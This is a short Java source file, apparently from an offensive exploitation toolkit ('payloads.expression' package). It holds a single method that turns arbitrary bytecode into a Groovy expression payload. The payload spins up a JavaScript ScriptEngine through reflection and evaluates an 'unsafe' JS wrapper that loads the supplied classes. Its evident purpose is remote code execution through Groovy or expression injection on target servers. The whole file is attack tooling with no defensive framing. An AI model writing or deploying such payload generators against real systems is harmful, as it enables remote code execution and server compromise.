package cn.butler.thirdparty.payloads.expression;

/**
 * Groovy(GroovyShell,GroovyLoader)类加载模板
 */
public class GroovyExpression {
    public static String groovyShellExpressModify(byte[] byteCode) {
        String jscode = JSExpression.unsafeExpressModify(byteCode);
        String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + jscode + "\");";
        return script;
    }
}
